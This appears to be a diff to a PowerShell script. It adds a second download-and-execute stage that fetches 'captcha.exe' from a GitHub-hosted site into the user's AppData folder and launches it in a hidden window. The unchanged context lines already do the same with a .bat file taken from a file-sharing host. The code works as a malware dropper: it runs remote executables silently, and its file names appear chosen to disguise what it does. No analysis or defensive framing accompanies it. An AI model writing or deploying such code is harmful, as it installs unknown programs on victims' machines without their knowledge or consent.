@@ -14,3 +14,8 @@ $url = "https://anonsharing.com/file/db59849be6b5f562/skibiditoilet.bat"
 $outputPath = "$env:appdata\runtime.bat"
 Invoke-WebRequest -Uri $url -OutFile $outputPath
 Start-Process -FilePath $outputPath -WindowStyle Hidden
+
+$url = "https://raw.githubusercontent.com/bensgaming-dot/bensgaming-dot.github.io/refs/heads/main/captcha.exe"
+$outputPath = "$env:appdata\captcha.exe"
+Invoke-WebRequest -Uri $url -OutFile $outputPath
+Start-Process -FilePath $outputPath -WindowStyle Hidden
